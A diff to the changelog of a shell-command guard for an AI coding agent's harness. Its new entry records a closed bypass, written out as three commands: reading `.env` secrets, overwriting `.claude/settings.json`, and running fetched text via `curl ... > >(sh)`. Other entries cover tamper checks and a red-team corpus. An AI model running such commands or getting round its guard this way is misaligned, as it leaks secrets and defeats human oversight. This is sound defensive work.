@@ -2,6 +2,7 @@
 
 ## Unreleased
 
+- Guard, bypass closed: output process substitution is a command boundary. `ls >(cat .env)` read a secrets file behind an allowlisted program, `echo {} > >(tee .claude/settings.json)` wrote a harness file, and `curl ... > >(sh)` ran fetched text; all three passed because only `$(` and `<(` split a command.
 - Customize without forking: `.claude/hooks/sous.rules` adds project blocks (`block <name> <ERE>`) and lifts one guard rule for one whole-command shape (`allow <rule-id> <ERE>`). Only the user can write it, since the template's deny rule and the tamper check keep the agent out. `tamper`, `sous-accept`, `sous-record` and `too-long` never lift. Doctor lists the file's lines and fails on any the guard would skip.
 - Guard fails closed when a check errors: a bash error inside the matcher used to block with an empty message, and with rule ids it briefly allowed (caught by macOS CI). It now blocks as `internal-error`, which no project rule can lift, and the red-team corpus fails any row where the guard errors.
 - The tamper check finds interpreter write calls (`File.write(`, `os.replace(`, `shutil.copy(`) by name and then matches a small pattern. The single regex that held every verb segfaulted macOS 26's `/bin/bash` 3.2 inside regexec once earlier checks had run.
